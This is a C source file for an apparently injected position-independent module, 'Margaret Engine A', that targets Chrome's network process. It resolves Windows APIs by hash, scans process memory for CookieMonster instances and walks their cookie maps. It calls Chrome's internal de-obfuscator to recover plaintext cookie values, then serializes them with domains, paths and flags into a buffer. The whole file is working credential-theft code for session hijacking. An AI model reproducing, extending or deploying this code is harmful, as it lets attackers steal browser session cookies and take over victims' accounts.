#define PIC_CODE_SECTION_NAME ".text$F"
#include "margaret.h"
#include "chromium_adapter.h"
#include "cc_layout.h"
#include "pic_resolve.h"

/*
 * Engine A "netsvc-store": vtable-anchored CookieMonster discovery + map
 * walk + cookie serialization.  Runs in the network utility process.
 *
 * Nothing about the CanonicalCookie layout is pinned: every field
 * offset comes from the runtime calibrator in cc_layout.c.  Every
 * walk is bounded and every pointer dereference is validated.
 */

typedef pic_u32 (PIC_MS_ABI *PIC_GET_TICK_COUNT_FN)(void);

/* --- bounded memory copy with capacity check --- */

static PIC_CODE pic_bool engine_a_write_bytes(pic_u8 **cursor,
                                               pic_u32 *remaining,
                                               const pic_u8 *source,
                                               pic_u32 length)
{
    if (*remaining < length) {
        return PIC_FALSE;
    }
    for (pic_u32 i = 0u; i < length; ++i) {
        (*cursor)[i] = source[i];
    }
    *cursor += length;
    *remaining -= length;
    return PIC_TRUE;
}

static PIC_CODE pic_bool engine_a_write_u32(pic_u8 **cursor,
                                             pic_u32 *remaining,
                                             pic_u32 value)
{
    if (*remaining < 4u) {
        return PIC_FALSE;
    }
    (*cursor)[0] = (pic_u8)(value & 0xFFu);
    (*cursor)[1] = (pic_u8)((value >> 8u) & 0xFFu);
    (*cursor)[2] = (pic_u8)((value >> 16u) & 0xFFu);
    (*cursor)[3] = (pic_u8)((value >> 24u) & 0xFFu);
    *cursor += 4u;
    *remaining -= 4u;
    return PIC_TRUE;
}

/* --- CookieMonster tree walk --- */

#define MARGARET_MAX_COOKIES_PER_INSTANCE 4096u
#define MARGARET_MAX_TREE_DEPTH 64u
/* Instance cap; false-positive vtable hits are rejected by the walk
 * vetting without a dereference, the caller timeout bounds the scan. */
#define MARGARET_MAX_INSTANCES 4096u

/* The cookie's first qword is its vtable pointer, which lives inside
 * chrome.dll.  Any non-cookie garbage fails this and is skipped. */
static PIC_CODE pic_bool engine_a_cookie_valid(const pic_u8 *cookie,
                                                pic_uptr chrome_base,
                                                pic_uptr chrome_size)
{
    pic_uptr vtable;
    if (!cc_ptr_plausible((pic_uptr)cookie)) {
        return PIC_FALSE;
    }
    vtable = (pic_uptr)cc_read_u64(cookie);
    return vtable >= chrome_base && vtable < chrome_base + chrome_size;
}

/*
 * In-order successor for a libc++ __tree_node.
 * node layout: left at +0x00, right at +0x08, parent at +0x10.
 */
static PIC_CODE pic_uptr engine_a_tree_next(const pic_u8 *node,
                                             pic_uptr end_sentinel)
{
    pic_uptr right;
    pic_uptr current;
    pic_uptr parent;
    pic_u32 depth;

    right = (pic_uptr)cc_read_u64(node + 0x08);
    if (right != 0u) {
        /* leftmost of right subtree */
        if (!cc_ptr_plausible(right)) {
            return 0u; /* malformed tree: stop this instance */
        }
        current = right;
        for (depth = 0u; depth < MARGARET_MAX_TREE_DEPTH; ++depth) {
            pic_uptr left = (pic_uptr)cc_read_u64((const pic_u8 *)current);
            if (left == 0u) {
                return current;
            }
            if (!cc_ptr_plausible(left)) {
                return 0u; /* malformed tree: stop this instance */
            }
            current = left;
        }
        return 0u; /* bound exceeded: malformed tree */
    }

    /* go up until we came from the right */
    current = (pic_uptr)node;
    for (depth = 0u; depth < MARGARET_MAX_TREE_DEPTH; ++depth) {
        parent = (pic_uptr)cc_read_u64((const pic_u8 *)current + 0x10);
        if (parent == 0u || parent == end_sentinel) {
            return 0u;
        }
        if (!cc_ptr_plausible(parent)) {
            return 0u; /* malformed tree: stop this instance */
        }
        {
            pic_uptr parent_left =
                (pic_uptr)cc_read_u64((const pic_u8 *)parent);
            /* the successor is the first ancestor reached from its
             * LEFT subtree: current = parent's left child */
            if (parent_left == current) {
                return parent;
            }
        }
        current = parent;
    }
    return 0u; /* bound exceeded */
}

/* --- cookie serialization --- */

/*
 * Serialize one CanonicalCookie into the output buffer.
 * Format: [name_len][name][domain_len][domain][path_len][path]
 *         [value_len][value]
 *         [creation(8)][expiry(8)][flags(4)][same_site(4)][port(4)]
 * The value is the PLAINTEXT from CanonicalCookie::Value() (the
 * de-obfuscating accessor; a direct call, no callback involved).
 * Atomic: the full size is computed first; if it does not fit, nothing is
 * written (the caller can rely on cookie_count == number of whole cookies).
 */
#define MARGARET_CC_FIXED_BYTES 32u /* value_len+creation+expiry+flags+samesite+port */

typedef void (PIC_MS_ABI *PIC_COOKIE_VALUE_FN)(void *out, void *cookie);

static PIC_CODE pic_bool engine_a_serialize_cookie(
    const pic_u8 *cookie,
    pic_u8 **cursor,
    pic_u32 *remaining,
    const pic_u8 *chrome_base,
    pic_uptr deobf_fn,
    const PIC_CC_LAYOUT *lay,
    PIC_FLAGS_CAL *flags_cal)
{
    PIC_CC_STRING_VIEW name;
    PIC_CC_STRING_VIEW domain;
    PIC_CC_STRING_VIEW path;
    PIC_CC_STRING_VIEW value;
    pic_u32 total;

    if (cookie == PIC_NULL || lay == PIC_NULL ||
        lay->calibrated != 1u) {
        return PIC_FALSE;
    }

    /* strings at the calibrated offsets */
    if (!cc_read_string(cookie + lay->off_name, &name) ||
        !cc_read_string(cookie + lay->off_domain, &domain) ||
        !cc_read_string(cookie + lay->off_path, &path)) {
        return PIC_FALSE;
    }

    /* value: when the calibrated ProcessBound flag is set, the direct
     * de-obfuscator call fn(rcx = &value_string, rdx = &out) writes
     * the plaintext libc++ string into out */
    value.data = PIC_NULL;
    value.length = 0u;
    if (deobf_fn != 0u && chrome_base != PIC_NULL &&
        cookie[lay->off_flag] == 1u) {
        pic_u8 out[24];
        (void)margaret_memzero(out, sizeof(out));
        ((PIC_COOKIE_VALUE_FN)deobf_fn)((void *)(cookie + lay->off_value),
                                        out);
        (void)cc_read_string(out, &value);
    }

    /* atomic size check: no partial cookie may remain in the buffer */
    total = 16u + name.length + domain.length + path.length + value.length +
            MARGARET_CC_FIXED_BYTES;
    if (*remaining < total) {
        return PIC_FALSE;
    }

    /* write: lengths then data */
    if (!engine_a_write_u32(cursor, remaining, name.length) ||
        !engine_a_write_bytes(cursor, remaining, name.data, name.length) ||
        !engine_a_write_u32(cursor, remaining, domain.length) ||
        !engine_a_write_bytes(cursor, remaining, domain.data, domain.length) ||
        !engine_a_write_u32(cursor, remaining, path.length) ||
        !engine_a_write_bytes(cursor, remaining, path.data, path.length) ||
        !engine_a_write_u32(cursor, remaining, value.length) ||
        !engine_a_write_bytes(cursor, remaining, value.data, value.length)) {
        return PIC_FALSE;
    }

    /* creation/expiry at the calibrated Time offsets */
    {
        pic_u8 time_buf[8];
        pic_u64 t = cc_read_u64(cookie + lay->off_creation);
        for (pic_u32 i = 0u; i < 8u; ++i) {
            time_buf[i] = (pic_u8)((t >> (i * 8u)) & 0xFFu);
        }
        if (!engine_a_write_bytes(cursor, remaining, time_buf, 8u)) {
            return PIC_FALSE;
        }
        t = cc_read_u64(cookie + lay->off_expiry);
        for (pic_u32 i = 0u; i < 8u; ++i) {
            time_buf[i] = (pic_u8)((t >> (i * 8u)) & 0xFFu);
        }
        if (!engine_a_write_bytes(cursor, remaining, time_buf, 8u)) {
            return PIC_FALSE;
        }
    }

    /* flags: calibrated secure_/httponly_ bools; evidence accrues
     * cookie by cookie until the mask converges */
    margaret_cc_flags_update(flags_cal, cookie,
                              name.data, name.length);
    if (!engine_a_write_u32(cursor, remaining,
                            margaret_cc_flags_read(flags_cal, cookie))) {
        return PIC_FALSE;
    }

    /* same_site / source_port at the calibrated pair (0 when the
     * bounded pattern did not validate) */
    if (!engine_a_write_u32(cursor, remaining,
                            lay->off_same_site != 0u
                                ? cc_read_u32(cookie + lay->off_same_site)
                                : 0u) ||
        !engine_a_write_u32(cursor, remaining,
                            lay->off_port != 0u
                                ? cc_read_u32(cookie + lay->off_port)
                                : 0u)) {
        return PIC_FALSE;
    }

    return PIC_TRUE;
}

/* --- discovery + walk + serialize (main Engine A entry) --- */

/*
 * Output format:
 *   [0..3]   magic "MCEA" (Margaret Cookie Engine A)
 *   [12..19] scan-end address; [20..27] last-hit address (diagnostics)
 *   [4..7]   cookie_count
 *   [8..11]  instance_count
 *   [12..15] reserved
 *   [16..]   serialized cookies (one after another)
 */
#define MARGARET_ENGINE_A_MAGIC 0x4145434Du /* "MCEA" LE */

PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
    PIC_CONTEXT *ctx,
    const MARGARET_CHROMIUM_ADAPTER *adapter,
    MARGARET_ARGS *args)
{
    void *kernel32_base;
    PIC_CC_VQ_FN virtual_query;
    PIC_GET_TICK_COUNT_FN get_tick_count;
    pic_u8 *cursor;
    pic_u32 remaining;
    pic_u32 cookie_count;
    pic_u32 instance_count;
    pic_u32 status;
    pic_uptr scan_end_addr;
    pic_uptr last_hit_addr;
    PIC_FLAGS_CAL flags_cal;
    PIC_CC_LAYOUT cc_layout;
    const pic_u8 *cal_sample[CAL_SAMPLE_MAX];
    pic_u32 cal_n;
    pic_u32 cal_diag;
    pic_u8 layout_failed;
    pic_uptr deobf_fn;
    const pic_u8 *chrome_base;
    pic_u32 chrome_size;

    if (ctx == PIC_NULL || adapter == PIC_NULL || args == PIC_NULL) {
        return (pic_u32)MARGARET_STATUS_BAD_ARGUMENT;
    }
    if (args->output_buffer == PIC_NULL || args->output_capacity < 32u) {
        args->output_length = 32u;
        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
    }

    /* resolve VirtualQuery from kernel32.dll */
    {
        PIC_HASH k32 = MARGARET_MODULE_HASH_KERNEL32_DLL;
        PIC_HASH vq = MARGARET_HASH_VIRTUALQUERY;
        PIC_HASH gtc = MARGARET_HASH_GETTICKCOUNT;
        if (pic_find_module(ctx, &k32, &kernel32_base) !=
            PIC_RESOLVE_OK) {
            ctx->last_error = (pic_u32)PIC_RESOLVE_MODULE_NOT_FOUND;
            args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
            return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
        }
        if (pic_resolve_export(ctx, kernel32_base, &vq,
                               (void **)&virtual_query) != PIC_RESOLVE_OK) {
            ctx->last_error = (pic_u32)PIC_RESOLVE_EXPORT_NOT_FOUND;
            args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
            return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
        }
        if (pic_resolve_export(ctx, kernel32_base, &gtc,
                               (void **)&get_tick_count) != PIC_RESOLVE_OK) {
            ctx->last_error = (pic_u32)PIC_RESOLVE_EXPORT_NOT_FOUND;
            args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
            return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
        }
    }

    scan_end_addr = 0u;
    last_hit_addr = 0u;
    cursor = (pic_u8 *)args->output_buffer;
    remaining = args->output_capacity;

    /* write header (fixed 32 bytes): magic + counts + scan diagnostics */
    if (!engine_a_write_u32(&cursor, &remaining, MARGARET_ENGINE_A_MAGIC)) {
        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
    }
    /* placeholders: cookie_count, instance_count, scan_end (2 u32),
     * last_hit (2 u32), reserved -- patched at the end */
    if (!engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u)) {
        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
    }

    cookie_count = 0u;
    instance_count = 0u;
    {
        PIC_FLAGS_CAL flags_cal_init;
        flags_cal_init.candidates = FLAGS_ALL_CAND;
        flags_cal_init.window_base = 0u;
        flags_cal_init.calibrated = 0u;
        flags_cal_init.secure_off = 0u;
        flags_cal = flags_cal_init;
    }
    (void)margaret_memzero(&cc_layout, sizeof(cc_layout));
    cal_n = 0u;
    cal_diag = 0u;
    layout_failed = 0u;
    status = (pic_u32)MARGARET_STATUS_OK;

    /* discover chrome.dll base */
    {
        if (!margaret_locate_chrome_dll(ctx, (void **)&chrome_base,
                                        &chrome_size)) {
            args->status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
            return (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
        }
        args->flags = 20u; /* engine: module re-located */

        deobf_fn = 0u;
        if (adapter->rva_canonical_cookie_deobfuscator != 0u) {
            deobf_fn = (pic_uptr)chrome_base +
                       adapter->rva_canonical_cookie_deobfuscator;
        }

        /* vtable address (relocated at runtime) */
        {
            const pic_u8 *vtable_ptr =
                chrome_base + adapter->rva_cookie_monster_vtable;
            pic_u64 vtable_va = (pic_u64)(pic_uptr)vtable_ptr;

            /* bounded committed-memory scan for CookieMonster instances */
            PIC_CC_MBI mbi;
            /* Full-range scan from the null page up.  The vtable VA also
             * appears as transient copies on thread stacks (high
             * addresses, past the image) and in low heaps; those hits
             * are cheap because the walk vetting rejects them without a
             * dereference, and the scan stops at the first cookie. */
            pic_uptr address = 0x10000u;
            /* No byte budget: the caller's timeout is the bound.  The
             * low-level scan is cheap in-process and the CM heap sits
             * at a high entropy address, far past where a fixed budget
             * expires. */
            pic_bool stop = PIC_FALSE;
            pic_u32 start_ticks = get_tick_count();
            pic_u32 timeout_ms = args->timeout_ms;

            while (!stop &&
                   instance_count < MARGARET_MAX_INSTANCES &&
                   cookie_count < MARGARET_MAX_COOKIES_PER_INSTANCE &&
                   (timeout_ms == 0u ||
                    (pic_u32)(get_tick_count() - start_ticks) <= timeout_ms)) {
                pic_uptr region_size;

                if (virtual_query((const void *)address, &mbi,
                                   sizeof(mbi)) == 0u) {
                    break;
                }
                region_size = mbi.RegionSize;
                if (region_size == 0u) {
                    break;
                }

                {
                    pic_u32 mbi_state = cc_read_u32(
                        (const pic_u8 *)&mbi + MBI_OFF_STATE);
                    pic_u32 mbi_protect = cc_read_u32(
                        (const pic_u8 *)&mbi + MBI_OFF_PROTECT);
                    if (mbi_state == MEM_COMMIT &&
                        (mbi_protect & 0xEEu) != 0u && /* readable+exec */
                        (mbi_protect & PAGE_GUARD) == 0u) {
                        /* scan this region for qwords == vtable_va */
                        const pic_u8 *region = (const pic_u8 *)mbi.BaseAddress;
                        pic_u32 region_u32 = (pic_u32)region_size;

                    /* bound the region scan */
                    if (region_u32 > 256u * 1024u * 1024u) {
                        region_u32 = 256u * 1024u * 1024u;
                    }

                    /* 8-byte aligned scan */
                    for (pic_u32 offset = 0u;
                         !stop &&
                         offset + 8u <= region_u32 &&
                         instance_count < MARGARET_MAX_INSTANCES;
                         offset += 8u) {
                        if (cc_read_u64(region + offset) == vtable_va) {
                            pic_uptr instance_addr =
                                (pic_uptr)(region + offset);

                            /* skip hits inside chrome.dll (rdata pointers) */
                            if (instance_addr >= (pic_uptr)chrome_base &&
                                instance_addr < (pic_uptr)chrome_base + chrome_size) {
                                continue;
                            }

                            /* candidate instance (validated by the walk) */
                            instance_count++;
                            last_hit_addr = instance_addr;

                            /* walk its cookie map */
                            {
                                const pic_u8 *cm = (const pic_u8 *)instance_addr;
                                PIC_CC_MBI vet_mbi;
                                pic_uptr node = cc_read_u64(cm + 0x30);
                                pic_uptr end_addr =
                                    (pic_uptr)(cm + 0x38);
                                pic_u32 node_count = 0u;

                                /* vet the untrusted begin node's region
                                 * before trusting any byte of it */
                                if (node != 0u && node != end_addr &&
                                    !cc_region_ok(
                                        (const void *)node, &vet_mbi,
                                        virtual_query)) {
                                    node = 0u;
                                }

                                while (!stop &&
                                       node != 0u &&
                                       node != end_addr &&
                                       node_count < MARGARET_MAX_COOKIES_PER_INSTANCE) {
                                    const pic_u8 *cookie;
                                    pic_uptr next_node;

                                    /* the node itself must be a plausible
                                     * heap pointer before we trust it */
                                    if (!cc_ptr_plausible(node)) {
                                        break;
                                    }
                                    cookie = (const pic_u8 *)cc_read_u64(
                                        (const pic_u8 *)node + 0x38);

                                    /* pre-compute the successor so a bad
                                     * cookie cannot abort the walk */
                                    next_node = engine_a_tree_next(
                                        (const pic_u8 *)node, end_addr);

                                    /* a cookie that fails the region or
                                     * vtable check is SKIPPED, not fatal:
                                     * the rest of the map is still there */
                                    if (cc_region_ok(
                                            (const void *)cookie, &vet_mbi,
                                            virtual_query) &&
                                        engine_a_cookie_valid(
                                            cookie, (pic_uptr)chrome_base,
                                            chrome_size)) {
                                        if (cc_layout.calibrated != 0u) {
                                            if (engine_a_serialize_cookie(
                                                    cookie, &cursor,
                                                    &remaining,
                                                    chrome_base,
                                                    deobf_fn,
                                                    &cc_layout,
                                                    &flags_cal)) {
                                                cookie_count++;
                                            } else {
                                                /* buffer full */
                                                status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
                                                stop = PIC_TRUE;
                                            }
                                        } else if (layout_failed == 0u &&
                                                   cal_n < CAL_SAMPLE_MAX) {
                                            /* stash until the layout
                                             * calibrates; retry with a
                                             * growing sample */
                                            cal_sample[cal_n] = cookie;
                                            cal_n++;
                                            if (cal_n >= CAL_SAMPLE_MIN &&
                                                margaret_cc_calibrate(
                                                    cal_sample, cal_n,
                                                    virtual_query,
                                                    &cc_layout,
                                                    &cal_diag)) {
                                                flags_cal.window_base =
                                                    cc_layout.off_flag + 8u;
                                                args->pad = 0xB1u;
                                                /* flush the stash */
                                                {
                                                    pic_u32 fi;
                                                    for (fi = 0u;
                                                         fi < cal_n &&
                                                         stop == PIC_FALSE;
                                                         ++fi) {
                                                        if (engine_a_serialize_cookie(
                                                                cal_sample[fi],
                                                                &cursor,
                                                                &remaining,
                                                                chrome_base,
                                                                deobf_fn,
                                                                &cc_layout,
                                                                &flags_cal)) {
                                                            cookie_count++;
                                                        } else {
                                                            status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
                                                            stop = PIC_TRUE;
                                                        }
                                                    }
                                                }
                                            } else if (cal_n == CAL_SAMPLE_MAX) {
                                                /* 16 cookies could not be
                                                 * explained by any layout:
                                                 * fail closed, no cookies;
                                                 * dump two raw samples for
                                                 * offline layout analysis */
                                                layout_failed = 1u;
                                                args->pad = 0xA0u + cal_diag;
                                                (void)engine_a_write_bytes(
                                                    &cursor, &remaining,
                                                    cal_sample[0], 0x110u);
                                                (void)engine_a_write_bytes(
                                                    &cursor, &remaining,
                                                    cal_sample[1], 0x110u);
                                                status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
                                                stop = PIC_TRUE;
                                            }
                                        }
                                    }
                                    node_count++;
                                    node = next_node;
                                }
                            }
                        }
                    }
                }
                }

                address = (pic_uptr)mbi.BaseAddress + region_size;
                if (address < (pic_uptr)mbi.BaseAddress) {
                    break; /* overflow */
                }
            }
            scan_end_addr = address;
        }
    }

    /* final calibration attempt for jars that yielded fewer than
     * CAL_SAMPLE_MAX samples; a jar that cannot supply even the
     * minimum fails closed — no cookies are ever serialized against
     * an unproven layout */
    if (cc_layout.calibrated == 0u && layout_failed == 0u) {
        if (cal_n >= CAL_SAMPLE_MIN &&
            margaret_cc_calibrate(cal_sample, cal_n, virtual_query,
                                      &cc_layout, &cal_diag)) {
            flags_cal.window_base = cc_layout.off_flag + 8u;
            args->pad = 0xB0u;
            {
                pic_u32 fi;
                for (fi = 0u; fi < cal_n; ++fi) {
                    if (engine_a_serialize_cookie(
                            cal_sample[fi], &cursor, &remaining,
                            chrome_base, deobf_fn, &cc_layout,
                            &flags_cal)) {
                        cookie_count++;
                    } else {
                        status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
                        break;
                    }
                }
            }
        } else {
            args->pad = (cal_n < CAL_SAMPLE_MIN) ? 0x9Fu : (0xA0u + cal_diag);
            if (cal_n >= 2u) {
                (void)engine_a_write_bytes(&cursor, &remaining,
                                           cal_sample[0], 0x110u);
                (void)engine_a_write_bytes(&cursor, &remaining,
                                           cal_sample[1], 0x110u);
            }
            status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
        }
    }

    args->flags = 30u; /* engine: memory scan + walk complete */
    /* patch header: cookie_count and instance_count */
    {
        pic_u8 *header = (pic_u8 *)args->output_buffer;
        header[4] = (pic_u8)(cookie_count & 0xFFu);
        header[5] = (pic_u8)((cookie_count >> 8u) & 0xFFu);
        header[6] = (pic_u8)((cookie_count >> 16u) & 0xFFu);
        header[7] = (pic_u8)((cookie_count >> 24u) & 0xFFu);
        header[8] = (pic_u8)(instance_count & 0xFFu);
        header[9] = (pic_u8)((instance_count >> 8u) & 0xFFu);
        header[10] = (pic_u8)((instance_count >> 16u) & 0xFFu);
        header[11] = (pic_u8)((instance_count >> 24u) & 0xFFu);
        /* scan diagnostics: where the scan stopped, and the last hit */
        header[12] = (pic_u8)(scan_end_addr & 0xFFu);
        header[13] = (pic_u8)((scan_end_addr >> 8u) & 0xFFu);
        header[14] = (pic_u8)((scan_end_addr >> 16u) & 0xFFu);
        header[15] = (pic_u8)((scan_end_addr >> 24u) & 0xFFu);
        header[16] = (pic_u8)((scan_end_addr >> 32u) & 0xFFu);
        header[17] = (pic_u8)((scan_end_addr >> 40u) & 0xFFu);
        header[18] = (pic_u8)((scan_end_addr >> 48u) & 0xFFu);
        header[19] = (pic_u8)((scan_end_addr >> 56u) & 0xFFu);
        header[20] = (pic_u8)(last_hit_addr & 0xFFu);
        header[21] = (pic_u8)((last_hit_addr >> 8u) & 0xFFu);
        header[22] = (pic_u8)((last_hit_addr >> 16u) & 0xFFu);
        header[23] = (pic_u8)((last_hit_addr >> 24u) & 0xFFu);
        header[24] = (pic_u8)((last_hit_addr >> 32u) & 0xFFu);
        header[25] = (pic_u8)((last_hit_addr >> 40u) & 0xFFu);
        header[26] = (pic_u8)((last_hit_addr >> 48u) & 0xFFu);
        header[27] = (pic_u8)((last_hit_addr >> 56u) & 0xFFu);
    }

    args->output_length = args->output_capacity - remaining;
    args->status = status;
    return status;
}
